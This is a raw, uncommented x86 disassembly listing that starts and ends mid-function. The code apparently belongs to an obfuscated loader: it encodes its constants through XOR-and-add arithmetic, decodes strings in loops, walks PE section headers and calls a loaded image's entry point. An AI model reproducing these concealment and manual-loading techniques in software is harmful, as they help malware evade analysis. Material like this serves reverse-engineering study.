  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
